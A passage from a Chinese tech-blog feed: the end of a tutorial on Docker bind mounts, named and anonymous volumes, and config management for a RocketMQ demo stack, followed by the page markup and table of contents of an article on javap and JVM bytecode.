    <span class="hljs-comment"># 检查敏感信息</span>
    <span class="hljs-keyword">if</span> grep -q <span class="hljs-string">"password|secret|key"</span> broker.conf; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"⚠️  发现可能的敏感信息，请确认已脱敏"</span>
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># 4. 配置部署</span>
<span class="hljs-function"><span class="hljs-title">deploy_config</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"🚀 部署配置文件..."</span>
    docker compose restart rmqbroker
    <span class="hljs-built_in">sleep</span> 5
    docker compose logs rmqbroker --<span class="hljs-built_in">tail</span>=20
}

<span class="hljs-comment"># 执行完整流水线</span>
validate_config
check_config_diff  
security_scan
deploy_config
</code></pre>
<h3 data-id="heading-10">2.3 配置绑定的高级特性</h3>
<h4 data-id="heading-11">配置模板与变量替换</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 使用 envsubst 进行配置模板化</span>
cat &gt; broker.conf.template &lt;&lt; 'EOF'
<span class="hljs-attr">brokerClusterName</span> = <span class="hljs-variable">${CLUSTER_NAME}</span>
<span class="hljs-attr">brokerName</span> = broker-<span class="hljs-variable">${BROKER_ID}</span>
<span class="hljs-attr">namesrvAddr</span> = <span class="hljs-variable">${NAMESRV_ADDR}</span>
EOF

<span class="hljs-comment"># 生成环境特定配置</span>
export <span class="hljs-attr">CLUSTER_NAME</span>=ProductionCluster
export <span class="hljs-attr">BROKER_ID</span>=a
export <span class="hljs-attr">NAMESRV_ADDR</span>=rmqnamesrv:<span class="hljs-number">9876</span>

envsubst &lt; broker.conf.template &gt; broker.conf
</code></pre>
<h4 data-id="heading-12">配置加密与安全</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 ansible-vault 加密敏感配置</span>
ansible-vault encrypt broker-secrets.conf

<span class="hljs-comment"># 在 CI/CD 中解密</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$VAULT_PASSWORD</span> | ansible-vault decrypt \
  --output broker.conf \
  broker-secrets.conf
</code></pre>
<h2 data-id="heading-13">三、命名卷挂载 (Named Volumes) 深度解析</h2>
<h3 data-id="heading-14">3.1 技术原理</h3>
<p>命名卷是 <strong>Docker 管理的持久化存储卷</strong>，具有唯一的名称，生命周期独立于容器。</p>
<h3 data-id="heading-15">3.2 项目实战：Redis 和 MongoDB 数据持久化</h3>
<p><strong>配置示例：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">redis:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">redis_data:/data</span>

<span class="hljs-attr">mongo:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_data:/data/db</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_config:/data/configdb</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">redis_data:</span>
  <span class="hljs-attr">mongo_data:</span>
  <span class="hljs-attr">mongo_config:</span>
</code></pre>
<p><strong>实战操作：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 查看命名卷信息</span>
docker volume <span class="hljs-built_in">ls</span>
docker volume inspect rocket-demo_redis_data

<span class="hljs-comment"># 2. 数据持久化验证</span>
<span class="hljs-comment"># 写入测试数据</span>
docker compose <span class="hljs-built_in">exec</span> redis redis-cli -a 123456 <span class="hljs-built_in">set</span> test_key <span class="hljs-string">"hello_redis"</span>

<span class="hljs-comment"># 重启服务验证数据持久化</span>
docker compose restart redis
docker compose <span class="hljs-built_in">exec</span> redis redis-cli -a 123456 get test_key

<span class="hljs-comment"># 3. 备份命名卷数据</span>
docker run --<span class="hljs-built_in">rm</span> -v rocket-demo_redis_data:/source -v $(<span class="hljs-built_in">pwd</span>)/backup:/backup alpine \
  tar czf /backup/redis_backup_$(<span class="hljs-built_in">date</span> +%Y%m%d).tar.gz -C /source .
</code></pre>
<p><strong>命名卷实际路径：</strong></p>
<p>根据您的图片信息，命名卷存储在 Docker 默认路径：</p>
<pre><code class="hljs language-bash" lang="bash">/var/lib/docker/volumes/rocket-demo_redis_data/_data
/var/lib/docker/volumes/rocket-demo_mongo_data/_data
</code></pre>
<h3 data-id="heading-16">3.3 管理命令大全</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建命名卷</span>
docker volume create my_volume

<span class="hljs-comment"># 查看卷详情</span>
docker volume inspect volume_name

<span class="hljs-comment"># 备份卷数据</span>
docker run --<span class="hljs-built_in">rm</span> -v volume_name:/source -v $(<span class="hljs-built_in">pwd</span>):/backup alpine \
  tar czf /backup/backup.tar.gz -C /source .

<span class="hljs-comment"># 恢复卷数据</span>
docker run --<span class="hljs-built_in">rm</span> -v volume_name:/target -v $(<span class="hljs-built_in">pwd</span>):/backup alpine \
  tar xzf /backup/backup.tar.gz -C /target

<span class="hljs-comment"># 清理未使用卷</span>
docker volume prune
</code></pre>
<h2 data-id="heading-17">四、匿名卷挂载 (Anonymous Volumes) 深度解析</h2>
<h3 data-id="heading-18">4.1 技术原理</h3>
<p>匿名卷是 <strong>Docker 自动创建和管理的临时卷</strong>，没有指定名称，通常用于容器运行时数据。</p>
<h3 data-id="heading-19">4.2 项目实战：RocketMQ NameServer 的匿名卷</h3>
<p><strong>配置分析：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">rmqnamesrv:</span>
  <span class="hljs-comment"># 没有配置 volumes，使用匿名卷</span>
</code></pre>
<p><strong>根据您的图片信息分析：</strong></p>
<p>从 <code>docker inspect rmqnamesrv</code>输出可以看到，容器使用匿名卷存储运行时数据：</p>
<pre><code class="hljs language-bash" lang="bash">/var/lib/docker/containers/8fbef265e72791e4aa229079f5e5820929546bebd9fd5beabdf53458fbfae99c/
</code></pre>
<p><strong>实战验证：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 查看匿名卷挂载点</span>
docker inspect rmqnamesrv | grep -A 10 -B 5 Mounts

<span class="hljs-comment"># 2. 验证数据非持久化</span>
<span class="hljs-comment"># 查看当前存储状态</span>
docker compose <span class="hljs-built_in">exec</span> rmqnamesrv <span class="hljs-built_in">du</span> -sh /home/rocketmq/store

<span class="hljs-comment"># 重启服务（数据可能丢失）</span>
docker compose restart rmqnamesrv
</code></pre>
<h3 data-id="heading-20">4.3 匿名卷的实际路径结构</h3>
<pre><code class="hljs language-ini" lang="ini">/var/lib/docker/containers/<span class="hljs-section">[容器ID]</span>/
├── mounts/           <span class="hljs-comment"># 挂载点目录</span>
├── resolv.conf       <span class="hljs-comment"># DNS配置</span>
├── hosts             <span class="hljs-comment"># 主机文件</span>
├── hostname          <span class="hljs-comment"># 主机名</span>
└── <span class="hljs-section">[容器ID]</span>-json.log <span class="hljs-comment"># 日志文件</span>
</code></pre>
<h2 data-id="heading-21">五、目录挂载 (Directory Mounts) 深度解析</h2>
<h3 data-id="heading-22">5.1 技术原理</h3>
<p>目录挂载是绑定挂载的一种特殊形式，专门用于<strong>挂载整个目录而非单个文件</strong>。</p>
<h3 data-id="heading-23">5.2 项目实战：SpringBoot 应用日志目录</h3>
<p><strong>配置示例：</strong></p>
<pre><code class="hljs language-bash" lang="bash">my-springboot-app:
  volumes:
    - ./logs:/home/spring/logs
</code></pre>
<p><strong>目录结构规划：</strong></p>
<pre><code class="hljs language-lua" lang="lua">rocket-demo/
├── logs/                           # 日志根目录
│   ├── application/               # 应用日志
│   │   ├── springboot-app.<span class="hljs-built_in">log</span>
│   │   └── <span class="hljs-built_in">error</span>.<span class="hljs-built_in">log</span>
│   └── rocketmqlogs/              # RocketMQ 客户端日志
│       ├── rocketmq_client.<span class="hljs-built_in">log</span>
│       └── rocketmq_app.<span class="hljs-built_in">log</span>
└── docker-compose.yml
</code></pre>
<p><strong>实战操作：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 创建日志目录结构</span>
<span class="hljs-built_in">mkdir</span> -p logs/application logs/rocketmqlogs
<span class="hljs-built_in">chmod</span> 755 logs logs/application logs/rocketmqlogs

<span class="hljs-comment"># 2. 验证日志写入</span>
docker compose logs my-springboot-app
<span class="hljs-built_in">ls</span> -la logs/application/

<span class="hljs-comment"># 3. 日志轮转配置（在宿主机设置）</span>
<span class="hljs-built_in">cat</span> &gt; /etc/logrotate.d/rocket-demo &lt;&lt; <span class="hljs-string">EOF
/root/rocket-demo/logs/application/*.log {
    daily
    missingok
    rotate 7
    compress
    delaycompress
    notifempty
    copytruncate
}
EOF</span>
</code></pre>
<h3 data-id="heading-24">5.3 权限管理最佳实践</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 设置正确的目录权限</span>
sudo <span class="hljs-built_in">chown</span> -R 1000:1000 logs/    <span class="hljs-comment"># 1000 是容器内应用用户的UID</span>
sudo <span class="hljs-built_in">chmod</span> -R 755 logs/

<span class="hljs-comment"># 在 Dockerfile 中确保用户一致性</span>
<span class="hljs-comment"># FROM openjdk:8-jdk-alpine</span>
<span class="hljs-comment"># RUN adduser -D -u 1000 spring</span>
<span class="hljs-comment"># USER spring</span>
</code></pre>
<h2 data-id="heading-25">六、配置文件绑定的四大优势深度实战</h2>
<h3 data-id="heading-26">6.1 ✅ 配置外部化的企业级实践</h3>
<p><strong>配置中心架构：</strong></p>
<pre><code class="hljs language-csharp" lang="csharp">config-center/
├── <span class="hljs-keyword">base</span>/                 <span class="hljs-meta"># 基础配置</span>
│   ├── broker-<span class="hljs-keyword">base</span>.conf
│   └── application-<span class="hljs-keyword">base</span>.yml
├── environments/         <span class="hljs-meta"># 环境配置</span>
│   ├── dev/
│   ├── test/
│   └── prod/
└── templates/           <span class="hljs-meta"># 配置模板</span>
    └── broker.conf.tpl
</code></pre>
<p><strong>动态配置注入：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># docker-compose.yml 支持环境变量注入</span>
rmqbroker:
  volumes:
    - ./config/<span class="hljs-variable">${ENV:-dev}</span>/broker.conf:/opt/rocketmq/conf/broker.conf
  environment:
    - ENV=<span class="hljs-variable">${ENV:-dev}</span>
    - CLUSTER_NAME=<span class="hljs-variable">${CLUSTER_NAME:-DefaultCluster}</span>
</code></pre>
<h3 data-id="heading-27">6.2 ✅ 实时编辑的开发效率提升</h3>
<p><strong>开发调试工作流：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># dev-watch.sh - 开发环境配置监听和热重载</span>

<span class="hljs-comment"># 监听配置文件变化</span>
inotifywait -m -e modify broker.conf |
<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> path action file; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"🔧 检测到配置变更: <span class="hljs-variable">$file</span>"</span>
    
    <span class="hljs-comment"># 验证配置语法</span>
    <span class="hljs-keyword">if</span> docker compose <span class="hljs-built_in">exec</span> rmqbroker <span class="hljs-built_in">test</span> -f /opt/rocketmq/conf/broker.conf; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"✅ 配置文件已同步到容器"</span>
        
        <span class="hljs-comment"># 尝试热重载</span>
        docker compose <span class="hljs-built_in">exec</span> rmqbroker sh -c <span class="hljs-string">"pkill -HUP java"</span> 2&gt;/dev/null &amp;&amp; \
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"🔥 配置热重载成功"</span> || \
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"⚠️  需要重启服务使配置生效"</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>
</code></pre>
<h3 data-id="heading-28">6.3 ✅ 版本控制的完整 Git 策略</h3>
<p><strong>Git 分支策略：</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 配置管理的 Git 工作流</span>
git flow feature start broker-config-optimization

<span class="hljs-meta"># 1. 在特性分支修改配置</span>
vim broker.conf
git <span class="hljs-keyword">add</span> broker.conf
git commit -m <span class="hljs-string">"feat: 优化Broker内存配置"</span>

<span class="hljs-meta"># 2. 代码审查后合并</span>
git flow feature finish broker-config-optimization

<span class="hljs-meta"># 3. 标签发布</span>
git tag -a v1<span class="hljs-number">.2</span><span class="hljs-number">.0</span>-config -m <span class="hljs-string">"版本1.2.0配置优化"</span>
</code></pre>
<p><strong>.gitattributes 配置：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 配置文件的合并策略</span>
broker.conf <span class="hljs-attr">merge</span>=union
*.conf <span class="hljs-attr">diff</span>=config

<span class="hljs-comment"># 敏感配置模板</span>
broker.conf.example text <span class="hljs-attr">eol</span>=lf
</code></pre>
<h3 data-id="heading-29">6.4 ✅ 环境适配的完整方案</h3>
<p><strong>环境配置矩阵：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># config-matrix.yml</span>
<span class="hljs-attr">environments:</span>
  <span class="hljs-attr">dev:</span>
    <span class="hljs-attr">broker_role:</span> <span class="hljs-string">ASYNC_MASTER</span>
    <span class="hljs-attr">auto_create_topic:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">memory:</span> <span class="hljs-string">512m</span>
  <span class="hljs-attr">test:</span>
    <span class="hljs-attr">broker_role:</span> <span class="hljs-string">SYNC_MASTER</span>  
    <span class="hljs-attr">auto_create_topic:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">memory:</span> <span class="hljs-string">1g</span>
  <span class="hljs-attr">prod:</span>
    <span class="hljs-attr">broker_role:</span> <span class="hljs-string">SYNC_MASTER</span>
    <span class="hljs-attr">auto_create_topic:</span> <span class="hljs-literal">false</span>
    <span class="hljs-attr">memory:</span> <span class="hljs-string">2g</span>
</code></pre>
<p><strong>配置生成脚本：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># generate-config.sh - 多环境配置生成</span>

ENV=<span class="hljs-variable">${1:-dev}</span>
CONFIG_MATRIX=<span class="hljs-string">"config-matrix.yml"</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"生成 <span class="hljs-variable">$ENV</span> 环境配置..."</span>

<span class="hljs-comment"># 从矩阵中提取配置</span>
BROKER_ROLE=$(yq <span class="hljs-built_in">eval</span> <span class="hljs-string">".environments.<span class="hljs-variable">$ENV</span>.broker_role"</span> <span class="hljs-variable">$CONFIG_MATRIX</span>)
AUTO_TOPIC=$(yq <span class="hljs-built_in">eval</span> <span class="hljs-string">".environments.<span class="hljs-variable">$ENV</span>.auto_create_topic"</span> <span class="hljs-variable">$CONFIG_MATRIX</span>)

<span class="hljs-comment"># 生成配置文件</span>
<span class="hljs-built_in">cat</span> &gt; config/<span class="hljs-variable">$ENV</span>/broker.conf &lt;&lt; <span class="hljs-string">EOF
# 自动生成配置 - $ENV 环境
brokerRole = $BROKER_ROLE
autoCreateTopicEnable = $AUTO_TOPIC
flushDiskType = ASYNC_FLUSH
namesrvAddr = rmqnamesrv:9876
EOF</span>

<span class="hljs-built_in">echo</span> <span class="hljs-string">"✅ <span class="hljs-variable">$ENV</span> 环境配置生成完成"</span>
</code></pre>
<h2 data-id="heading-30">七、生产环境最佳实践</h2>
<h3 data-id="heading-31">7.1 挂载方式选择指南</h3>









































<table><thead><tr><th>数据类型</th><th>推荐挂载方式</th><th>理由</th><th>示例</th></tr></thead><tbody><tr><td><strong>应用配置</strong>​</td><td>绑定挂载</td><td>四大优势完美契合配置管理</td><td><code>./config:/app/config</code></td></tr><tr><td><strong>数据库数据</strong>​</td><td>命名卷</td><td>Docker 管理、备份方便</td><td><code>db_data:/var/lib/mysql</code></td></tr><tr><td><strong>日志文件</strong>​</td><td>目录挂载</td><td>实时查看、日志收集</td><td><code>./logs:/app/logs</code></td></tr><tr><td><strong>临时缓存</strong>​</td><td>匿名卷</td><td>自动清理、性能好</td><td>不配置 volumes</td></tr><tr><td><strong>敏感数据</strong>​</td><td>命名卷 + 加密</td><td>安全隔离</td><td><code>encrypted_volume:/secrets</code></td></tr></tbody></table>
<h3 data-id="heading-32">7.2 配置文件绑定的安全加固</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 配置文件权限控制</span>
<span class="hljs-built_in">chmod</span> 600 broker.conf                    <span class="hljs-comment"># 只允许所有者读写</span>
<span class="hljs-built_in">chown</span> root:root broker.conf             <span class="hljs-comment">#  root 用户所有权</span>
setfacl -m u:spring:r broker.conf       <span class="hljs-comment"># 容器用户只读权限</span>

<span class="hljs-comment"># 2. 配置加密存储</span>
ansible-vault encrypt broker.conf       <span class="hljs-comment"># Ansible Vault 加密</span>
gpg --encrypt --recipient devops@company.com broker.conf  <span class="hljs-comment"># GPG 加密</span>

<span class="hljs-comment"># 3. 配置完整性验证</span>
<span class="hljs-built_in">sha256sum</span> broker.conf &gt; broker.conf.sha256
<span class="hljs-comment"># 部署前验证</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-subst">$(cat broker.conf.sha256)</span> broker.conf"</span> | <span class="hljs-built_in">sha256sum</span> -c
</code></pre>
<p><strong>好的配置管理是成功部署的基石</strong>，合理运用这些挂载策略，将极大提升您的 DevOps 效率和系统可靠性。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JDK 工具学习系列（五）：深入理解 javap、字节码与常量池]]></title>    <link>https://juejin.cn/post/7575718948298096691</link>    <guid>https://juejin.cn/post/7575718948298096691</guid>    <pubDate>2025-11-24T03:04:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575718948298096691" data-draft-id="7575412016405823498" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JDK 工具学习系列（五）：深入理解 javap、字节码与常量池"/> <meta itemprop="keywords" content="Java,JVM"/> <meta itemprop="datePublished" content="2025-11-24T03:04:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="日月星辰Ace"/> <meta itemprop="url" content="https://juejin.cn/user/2225067264583453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JDK 工具学习系列（五）：深入理解 javap、字节码与常量池
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2225067264583453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    日月星辰Ace
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:04:10.000Z" title="Mon Nov 24 2025 03:04:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JDK 工具学习系列（五）：深入理解 javap、JVM 字节码与常量池</h2>
<h3 data-id="heading-1">目录</h3>
<ol>
<li><a href="#%E5%89%8D%E8%A8%80" title="#%E5%89%8D%E8%A8%80">前言</a></li>
<li><a href="#java-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%9E%B6%E6%9E%84%E4%B8%8E%E6%89%A7%E8%A1%8C%E6%A8%A1%E5%9E%8B" title="#java-%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%9E%B6%E6%9E%84%E4%B8%8E%E6%89%A7%E8%A1%8C%E6%A8%A1%E5%9E%8B">Java 虚拟机架构与执行模型</a>
<ul>
<li><a href="#jvm-%E7%9A%84%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84" title="#jvm-%E7%9A%84%E6%95%B4%E4%BD%93%E6%9E%B6%E6%9E%84">JVM 的整体架构</a></li>
<li><a href="#%E5%9F%BA%E4%BA%8E%E6%A0%88%E7%9A%84%E6%89%A7%E8%A1%8C%E5%BC%95%E6%93%8E" title="#%E5%9F%BA%E4%BA%8E%E6%A0%88%E7%9A%84%E6%89%A7%E8%A1%8C%E5%BC%95%E6%93%8E">基于栈的执行引擎</a></li>
<li><a href="#jvm-%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84" title="#jvm-%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84">JVM 的内存结构</a></li>
</ul>
</li>
<li><a href="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%AF%94%E7%89%B9%E5%AD%97%E8%8A%82%E4%B8%8E%E5%AD%97%E8%8A%82%E7%A0%81" title="#%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E6%AF%94%E7%89%B9%E5%AD%97%E8%8A%82%E4%B8%8E%E5%AD%97%E8%8A%82%E7%A0%81">基础概念：比特、字节与字节码</a>
<ul>
<li><a href="#%E6%AF%94%E7%89%B9bit%E4%B8%8E%E5%AD%97%E8%8A%82byte" title="#%E6%AF%94%E7%89%B9bit%E4%B8%8E%E5%AD%97%E8%8A%82byte">比特（bit）与字节（byte）</a></li>
<li><a href="#%E5%AD%97%E8%8A%82%E7%A0%81bytecode" title="#%E5%AD%97%E8%8A%82%E7%A0%81bytecode">字节码（Bytecode）</a></li>
<li><a href="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84" title="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84">字节码文件结构</a></li>
</ul>
</li>
<li><a href="#jvm-%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B" title="#jvm-%E5%AD%97%E8%8A%82%E7%A0%81%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B">JVM 字节码的执行流程</a>
<ul>
<li><a href="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F" title="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%8C%87%E4%BB%A4%E7%9A%84%E6%A0%BC%E5%BC%8F">字节码指令的格式</a></li>
<li><a href="#%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8" title="#%E6%93%8D%E4%BD%9C%E6%95%B0%E6%A0%88%E4%B8%8E%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F%E8%A1%A8">操作数栈与局部变量表</a></li>
<li><a href="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AE%9E%E9%99%85%E4%BE%8B%E5%AD%90" title="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E5%AE%9E%E9%99%85%E4%BE%8B%E5%AD%90">字节码执行的实际例子</a></li>
</ul>
</li>
<li><a href="#%E5%B8%B8%E9%87%8F%E6%B1%A0%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3" title="#%E5%B8%B8%E9%87%8F%E6%B1%A0%E6%9C%BA%E5%88%B6%E8%AF%A6%E8%A7%A3">常量池机制详解</a>
<ul>
<li><a href="#%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E7%B1%BB%E5%9E%8B" title="#%E5%B8%B8%E9%87%8F%E6%B1%A0%E7%9A%84%E4%BD%9C%E7%94%A8%E4%B8%8E%E7%B1%BB%E5%9E%8B">常量池的作用与类型</a></li>
